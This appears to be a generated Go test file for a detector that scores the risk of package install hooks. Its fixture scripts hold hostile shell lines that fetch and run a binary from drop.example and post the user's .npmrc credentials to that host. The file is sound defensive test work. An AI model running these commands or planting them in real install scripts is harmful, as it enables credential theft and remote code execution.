package task

import (
	"errors"
	"strings"
	"testing"

	impl "gsb/batch51-go-safety-c-34"
)

func testBudget() impl.Budget {
	return impl.Budget{MaxDepth: 3, MaxBytes: 4096}
}

func hookManifest(script string) impl.Manifest {
	return impl.Manifest{
		Name:    "left-pad-plus",
		Version: "2.4.1",
		Files:   map[string]string{"hooks/postinstall.sh": script},
	}
}

func TestExtractListsHooksInOrder(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	m := impl.Manifest{
		Name: "left-pad-plus",
		Files: map[string]string{
			"hooks/pre.sh":  "#!/bin/sh\necho pre\n",
			"hooks/post.sh": "#!/bin/sh\necho post\n",
		},
		Hooks: []impl.Hook{
			{Stage: impl.StagePreinstall, Script: "hooks/pre.sh"},
			{Stage: impl.StagePostinstall, Script: "hooks/post.sh"},
		},
	}
	hooks, err := an.Extract(m)
	if err != nil {
		t.Fatalf("extract must succeed, got %v", err)
	}
	if len(hooks) != 2 {
		t.Fatalf("extracted hooks = %d, want 2", len(hooks))
	}
	if hooks[0].Stage != impl.StagePreinstall || hooks[0].Script != "hooks/pre.sh" {
		t.Fatalf("first hook = %+v, want the preinstall script", hooks[0])
	}
	if hooks[1].Stage != impl.StagePostinstall || hooks[1].Script != "hooks/post.sh" {
		t.Fatalf("second hook = %+v, want the postinstall script", hooks[1])
	}
}

func TestExtractRejectsUnknownStage(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	m := impl.Manifest{
		Name:  "left-pad-plus",
		Files: map[string]string{"hooks/pre.sh": "#!/bin/sh\n"},
		Hooks: []impl.Hook{{Stage: "prepare", Script: "hooks/pre.sh"}},
	}
	if _, err := an.Extract(m); !errors.Is(err, impl.ErrBadStage) {
		t.Fatalf("an unsupported stage must fail with ErrBadStage, got %v", err)
	}
	missing := impl.Manifest{
		Name:  "left-pad-plus",
		Files: map[string]string{},
		Hooks: []impl.Hook{{Stage: impl.StagePreinstall, Script: "hooks/absent.sh"}},
	}
	if _, err := an.Extract(missing); !errors.Is(err, impl.ErrMissingScript) {
		t.Fatalf("a hook pointing outside the package must fail with ErrMissingScript, got %v", err)
	}
}

func TestScoreCombinesNetworkAndExec(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	m := hookManifest("#!/bin/sh\ncurl -sSf https://drop.example/x -o /tmp/y\nexec /tmp/y\n")
	a, err := an.Score(m, []impl.Hook{{Stage: impl.StagePostinstall, Script: "hooks/postinstall.sh"}})
	if err != nil {
		t.Fatalf("score must succeed, got %v", err)
	}
	if a.Score != 75 {
		t.Fatalf("score = %d, want 25+20+30 = 75 for network and exec together", a.Score)
	}
	if a.Level != impl.LevelHigh {
		t.Fatalf("level = %q, want %q", a.Level, impl.LevelHigh)
	}
	if a.Verdict != impl.VerdictSuspicious {
		t.Fatalf("verdict = %q, want %q", a.Verdict, impl.VerdictSuspicious)
	}
	if a.Package != "left-pad-plus" {
		t.Fatalf("assessment package = %q, want left-pad-plus", a.Package)
	}
}

func TestScoreCredentialWithNetworkIsMalicious(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	m := hookManifest("#!/bin/sh\ncurl -sSf https://drop.example/c -d @$HOME/.npmrc\n")
	a, err := an.Score(m, []impl.Hook{{Stage: impl.StagePostinstall, Script: "hooks/postinstall.sh"}})
	if err != nil {
		t.Fatalf("score must succeed, got %v", err)
	}
	if a.Score != 95 {
		t.Fatalf("score = %d, want 30+25+40 = 95 for credential reading and network together", a.Score)
	}
	if a.Verdict != impl.VerdictMalicious {
		t.Fatalf("verdict = %q, want %q", a.Verdict, impl.VerdictMalicious)
	}
	if a.Level != impl.LevelCritical {
		t.Fatalf("level = %q, want %q", a.Level, impl.LevelCritical)
	}
}

func TestScoreSingleCapabilityIsSuspicious(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	m := hookManifest("#!/bin/sh\ncurl -sSf https://drop.example/x -o /tmp/y\n")
	a, err := an.Score(m, []impl.Hook{{Stage: impl.StagePostinstall, Script: "hooks/postinstall.sh"}})
	if err != nil {
		t.Fatalf("score must succeed, got %v", err)
	}
	if a.Score != 25 {
		t.Fatalf("score = %d, want the plain network weight 25 without any combination bonus", a.Score)
	}
	if a.Level != impl.LevelMedium {
		t.Fatalf("level = %q, want %q", a.Level, impl.LevelMedium)
	}
	if a.Verdict != impl.VerdictSuspicious {
		t.Fatalf("verdict = %q, want %q", a.Verdict, impl.VerdictSuspicious)
	}
}

func TestExplainRendersHeaderAndEvidence(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	out := an.Explain(impl.Assessment{
		Package: "left-pad-plus",
		Score:   75,
		Level:   impl.LevelHigh,
		Verdict: impl.VerdictSuspicious,
		Evidence: []impl.Evidence{
			{Capability: impl.CapNetworkDownload, Source: "hooks/postinstall.sh", Snippet: "curl -sSf https://drop.example/x"},
		},
	})
	if out == "" {
		t.Fatalf("explanation must not be empty")
	}
	first := strings.SplitN(out, "\n", 2)[0]
	if first != "score=75 level=high verdict=suspicious" {
		t.Fatalf("explanation header = %q, want score=75 level=high verdict=suspicious", first)
	}
	if !strings.Contains(out, impl.CapNetworkDownload) {
		t.Fatalf("explanation must list the capability, got %q", out)
	}
}

func TestDecodeLayersPeelsOneLayer(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	text, layers, truncated, err := an.DecodeLayers("ZWNobyBoaQ==", testBudget())
	if err != nil {
		t.Fatalf("decode must succeed, got %v", err)
	}
	if text != "echo hi" {
		t.Fatalf("decoded text = %q, want %q", text, "echo hi")
	}
	if layers != 1 {
		t.Fatalf("decoded layers = %d, want 1", layers)
	}
	if truncated {
		t.Fatalf("a payload inside the budget must not be marked truncated")
	}
}

func TestDecodeLayersRejectsEmptyBlob(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	if _, _, _, err := an.DecodeLayers("   ", testBudget()); !errors.Is(err, impl.ErrEmptyBlob) {
		t.Fatalf("an empty payload must fail with ErrEmptyBlob, got %v", err)
	}
}

func TestDetectCapabilitiesFindsEnvWrite(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	ev := an.DetectCapabilities("hooks/preinstall.sh", "#!/bin/sh\nexport PATH=/tmp/bin:$PATH\n")
	if len(ev) != 1 {
		t.Fatalf("evidence = %+v, want exactly one capability", ev)
	}
	if ev[0].Capability != impl.CapEnvWrite {
		t.Fatalf("capability = %q, want %q", ev[0].Capability, impl.CapEnvWrite)
	}
	if ev[0].Source != "hooks/preinstall.sh" {
		t.Fatalf("evidence source = %q, want hooks/preinstall.sh", ev[0].Source)
	}
	if !strings.Contains(ev[0].Snippet, "export") {
		t.Fatalf("evidence snippet = %q, want the matching line", ev[0].Snippet)
	}
}

func TestFollowScriptsFollowsOneLevel(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	m := impl.Manifest{
		Name: "left-pad-plus",
		Files: map[string]string{
			"hooks/install.sh": "#!/bin/sh\n. hooks/helper.sh\necho done\n",
			"hooks/helper.sh":  "echo helper\n",
		},
	}
	got, err := an.FollowScripts(m, "hooks/install.sh", 2)
	if err != nil {
		t.Fatalf("following scripts must succeed, got %v", err)
	}
	if len(got) != 1 {
		t.Fatalf("followed scripts = %v, want one helper script", got)
	}
	if got[0] != "hooks/helper.sh" {
		t.Fatalf("followed script = %q, want hooks/helper.sh", got[0])
	}
}

func TestResolvePathNormalizesDotSegments(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	got, ok := an.ResolvePath("hooks/install.sh", "./helpers/net.sh")
	if !ok {
		t.Fatalf("a relative reference inside the package must resolve")
	}
	if got != "hooks/helpers/net.sh" {
		t.Fatalf("resolved path = %q, want hooks/helpers/net.sh", got)
	}
	if got, ok := an.ResolvePath("hooks/install.sh", "helper.sh"); !ok || got != "hooks/helper.sh" {
		t.Fatalf("sibling reference resolved to %q ok=%v, want hooks/helper.sh", got, ok)
	}
}

func TestCombineScoreCapsAtHundred(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	score := an.CombineScore([]impl.Evidence{
		{Capability: impl.CapNetworkDownload},
		{Capability: impl.CapProcessExec},
		{Capability: impl.CapCredentialRead},
		{Capability: impl.CapEnvWrite},
		{Capability: impl.CapFileWrite},
	})
	if score != 100 {
		t.Fatalf("combined score = %d, want the hard cap 100", score)
	}
}

func TestSortedEvidenceOrdersAndDedupes(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	out := an.SortedEvidence([]impl.Evidence{
		{Capability: impl.CapEnvWrite, Source: "b.sh", Snippet: "export A=1"},
		{Capability: impl.CapCredentialRead, Source: "a.sh", Snippet: ".npmrc"},
		{Capability: impl.CapEnvWrite, Source: "a.sh", Snippet: "export B=2"},
		{Capability: impl.CapEnvWrite, Source: "a.sh", Snippet: "export B=2"},
	})
	if len(out) != 3 {
		t.Fatalf("sorted evidence = %+v, want three entries after deduplication", out)
	}
	wantCap := []string{impl.CapCredentialRead, impl.CapEnvWrite, impl.CapEnvWrite}
	wantSrc := []string{"a.sh", "a.sh", "b.sh"}
	for i := range wantCap {
		if out[i].Capability != wantCap[i] || out[i].Source != wantSrc[i] {
			t.Fatalf("entry %d = %s/%s, want %s/%s", i, out[i].Capability, out[i].Source, wantCap[i], wantSrc[i])
		}
	}
}

func TestStagesListsUniqueStagesInOrder(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	got := an.Stages([]impl.Hook{
		{Stage: impl.StagePreinstall},
		{Stage: impl.StagePostinstall},
		{Stage: impl.StagePreinstall},
	})
	if len(got) != 2 {
		t.Fatalf("stages = %v, want two distinct entries", got)
	}
	if got[0] != impl.StagePreinstall || got[1] != impl.StagePostinstall {
		t.Fatalf("stages = %v, want preinstall then postinstall", got)
	}
}

func TestScoreMarksOpaquePayloadUndetermined(t *testing.T) {
	an := impl.NewPackageInstallHookAnalyzer(testBudget())
	m := impl.Manifest{
		Name:    "left-pad-plus",
		Version: "2.4.1",
		Files:   map[string]string{"hooks/postinstall.sh": "!!not-base64!!"},
	}
	a, err := an.Score(m, []impl.Hook{{
		Stage:    impl.StagePostinstall,
		Script:   "hooks/postinstall.sh",
		Encoded:  true,
		Platform: "linux",
	}})
	if err != nil {
		t.Fatalf("an undecodable payload must still produce an assessment, got %v", err)
	}
	if !a.Opaque {
		t.Fatalf("assessment must be marked opaque when the payload cannot be decoded")
	}
	if a.Verdict != impl.VerdictUndetermined {
		t.Fatalf("verdict = %q, want %q instead of a zero risk verdict", a.Verdict, impl.VerdictUndetermined)
	}
}
